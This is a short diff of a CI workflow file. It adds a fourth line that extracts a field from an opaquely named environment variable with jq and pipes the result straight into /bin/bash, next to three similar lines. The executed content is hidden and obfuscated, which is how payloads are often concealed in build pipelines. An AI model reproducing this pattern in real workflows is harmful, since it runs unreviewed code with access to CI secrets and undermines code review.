@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$nv730" | jq -r .pp05183 | /bin/bash
           echo $mgi3 | jq -r .trjn31 | /bin/bash
           printf '%s' "$sli46" | jq -r .ksx09 | /bin/bash
+          echo $nhi70 | jq -r .mj37639 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
